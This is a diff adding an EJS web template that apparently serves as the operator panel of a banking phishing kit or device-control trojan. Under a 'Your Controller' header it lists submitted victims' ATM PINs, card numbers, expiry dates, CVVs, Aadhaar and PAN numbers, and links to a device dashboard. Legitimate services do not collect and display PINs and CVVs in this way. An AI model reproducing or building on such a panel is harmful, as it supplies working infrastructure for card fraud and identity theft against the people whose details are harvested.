@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css"/>
+</head>
+<body>
+  <header class="header-nav">
+    <h1>Your Controller</h1>
+  </header>
+
+  <div class="user-detail-container">
+    <h2>User Details</h2>
+
+    <!-- USER SECTION -->
+    <% if (user) { %>
+      <div class="card">
+        <h3>User Information</h3>
+        <p><strong>Mobile No:</strong> <%= user.mobileNumber %></p>
+        <p><strong>DOB:</strong> <%= user.dob %></p>
+        <p><strong>ATM PIN:</strong> <%= user.atmPin %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(user.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+        <p><strong>User data not available</strong></p>
+      </div>
+    <% } %>
+
+    <!-- NET BANKING SECTION -->
+    <% if (netBanking) { %>
+      <div class="card">
+        <h3>Net Banking Information</h3>
+        <p><strong>Aadhaar Number:</strong> <%= netBanking.aadhaarNumber %></p>
+        <p><strong>PAN Number:</strong> <%= netBanking.panNumber %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(netBanking.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+        <p><strong>Net banking details not available</strong></p>
+      </div>
+    <% } %>
+
+    <!-- CARD SECTION -->
+    <% if (card) { %>
+      <div class="card">
+        <h3>Card Information</h3>
+        <p><strong>Card Number:</strong> <%= card.cardNumber %></p>
+        <p><strong>Expiry Date:</strong> <%= card.expiryDate %></p>
+        <p><strong>CVV:</strong> <%= card.cvv %></p>
+        <p><strong>Submitted At:</strong> <%= new Date(card.submittedAt).toLocaleString() %></p>
+      </div>
+    <% } else { %>
+      <div class="card">
+        <p><strong>Card details not available</strong></p>
+      </div>
+    <% } %>
+
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+</body>
+</html>
